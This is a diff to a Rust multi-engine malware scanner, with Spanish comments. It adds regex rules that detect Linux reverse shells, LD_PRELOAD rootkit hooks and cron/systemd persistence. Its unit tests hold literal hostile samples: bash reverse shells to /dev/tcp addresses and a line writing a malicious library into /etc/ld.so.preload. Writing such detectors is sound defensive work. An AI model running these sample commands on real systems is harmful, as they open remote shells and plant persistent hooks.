@@ -93,6 +93,36 @@ impl MultiEngineScanner {
                 severity: "Alta".to_string(),
             });
         }
+
+        // Regla 5: Linux Interactive Reverse Shell (Bash/Python/Perl/Netcat)
+        if let Ok(re) = Regex::new(r#"(?i)(/bin/(ba)?sh|python[23]?|perl|nc|netcat).*?(-i|/dev/tcp/|socket\.socket|exec\s*\(\s*["']import)"#) {
+            self.pattern_rules.push(PatternRule {
+                name: "Trojan.Linux.InteractiveReverseShell".to_string(),
+                description: "Payload de shell reversa interactiva hacia host remoto en Linux".to_string(),
+                pattern: re,
+                severity: "Crítica".to_string(),
+            });
+        }
+
+        // Regla 6: Secuestro de cargador dinámico LD_PRELOAD (Linux Rootkit Hook)
+        if let Ok(re) = Regex::new(r#"(?i)(/etc/ld\.so\.preload|LD_PRELOAD.*?\.so|dlsym\s*\(\s*RTLD_NEXT)"#) {
+            self.pattern_rules.push(PatternRule {
+                name: "Rootkit.Linux.LdPreloadHook".to_string(),
+                description: "Inyección o secuestro de librerías compartidas mediante LD_PRELOAD".to_string(),
+                pattern: re,
+                severity: "Alta".to_string(),
+            });
+        }
+
+        // Regla 7: Persistencia no autorizada en Cron / Systemd
+        if let Ok(re) = Regex::new(r#"(?i)(/etc/cron\.(d|daily|hourly)|/var/spool/cron|/etc/systemd/system/.*?\.service).*?(curl|wget|base64|sh\s+-c)"#) {
+            self.pattern_rules.push(PatternRule {
+                name: "Persistence.Linux.MaliciousCronOrService".to_string(),
+                description: "Patrón de persistencia maliciosa mediante tareas cron o servicios systemd con descarga oculta".to_string(),
+                pattern: re,
+                severity: "Alta".to_string(),
+            });
+        }
     }
 
     /// Escanea un archivo individual utilizando firmas ClamAV/Hashes y reglas YARA/Heurísticas
@@ -579,6 +609,10 @@ fn has_suspicious_indicators(data: &[u8]) -> bool {
         || contains_case_insensitive(data, b"cryptunprotectdata")
         || contains_case_insensitive(data, b"os_crypt")
         || contains_case_insensitive(data, b"encrypted_key")
+        || contains_case_insensitive(data, b"/dev/tcp/")
+        || contains_case_insensitive(data, b"ld.so.preload")
+        || contains_case_insensitive(data, b"ld_preload")
+        || contains_case_insensitive(data, b"/etc/cron")
 }
 
 fn contains_case_insensitive(haystack: &[u8], needle: &[u8]) -> bool {
@@ -678,5 +712,16 @@ mod tests {
         assert!(has_suspicious_indicators(b"AmsiUtils amsiInitFailed bypass"));
         assert!(has_suspicious_indicators(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"));
         assert!(has_suspicious_indicators(b"CryptUnprotectData Login Data"));
+        assert!(has_suspicious_indicators(b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
+        assert!(has_suspicious_indicators(b"echo '/lib/evil.so' >> /etc/ld.so.preload"));
+    }
+
+    #[test]
+    fn test_linux_threat_detection() {
+        let scanner = MultiEngineScanner::new();
+        let payload = b"#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n";
+        let res = scanner.scan_bytes(payload, "revshell.sh");
+        assert_eq!(res.status, FileScanStatus::Infected);
+        assert!(res.detection_name.unwrap().contains("ReverseShell"));
     }
 }
